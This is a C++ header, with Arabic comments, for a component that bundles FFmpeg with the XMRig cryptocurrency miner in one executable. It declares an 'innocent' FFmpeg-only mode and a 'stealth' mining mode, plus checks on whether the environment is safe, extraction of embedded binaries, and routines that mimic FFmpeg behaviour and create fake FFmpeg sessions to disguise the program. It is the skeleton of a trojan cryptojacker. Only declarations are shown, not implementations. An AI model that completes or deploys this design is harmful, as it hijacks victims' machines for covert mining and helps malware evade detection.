#ifndef BINARY_FUSION_H
#define BINARY_FUSION_H

#include <string>
#include <vector>
#include <memory>

/**
 * نظام دمج الملفات الثنائية المتقدم
 * يدمج FFmpeg + XMRig في ملف تنفيذي واحد مع تبديل ذكي
 */
class BinaryFusion {
public:
    enum ExecutionMode {
        INNOCENT_MODE,    // تشغيل FFmpeg فقط
        STEALTH_MODE,     // تشغيل XMRig فقط
        HYBRID_MODE       // تشغيل الاثنين بالتوازي
    };
    
    BinaryFusion();
    ~BinaryFusion();
    
    // استخراج الملفات المدمجة
    bool extractEmbeddedBinaries();
    
    // تحديد وضع التشغيل بناءً على البيئة
    ExecutionMode detectOptimalMode();
    
    // تشغيل الوضع المحدد
    bool executeMode(ExecutionMode mode);
    
    // تبديل ديناميكي بين الأوضاع
    void dynamicModeSwitching();
    
    // تنظيف الملفات المستخرجة
    void cleanup();
    
    // فحص صحة الملفات المدمجة
    bool validateEmbeddedData();
    
private:
    std::string ffmpegPath;
    std::string xmrigPath;
    std::string configPath;
    ExecutionMode currentMode;
    bool isRunning;
    
    // استخراج ملفات محددة
    bool extractFFmpeg();
    bool extractXMRig();
    bool extractConfig();
    
    // تشغيل البرامج
    pid_t runFFmpeg();
    pid_t runXMRig();
    
    // مراقبة العمليات
    void monitorProcesses();
    bool isEnvironmentSafe();
    
    // تمويه البرنامج
    void mimicFFmpegBehavior();
    void createFakeFFmpegSession();
};

// بيانات الملفات المدمجة
extern const unsigned char embedded_ffmpeg[];
extern const size_t embedded_ffmpeg_size;

extern const unsigned char embedded_xmrig[];
extern const size_t embedded_xmrig_size;

extern const unsigned char embedded_config[];
extern const size_t embedded_config_size;

#endif // BINARY_FUSION_H
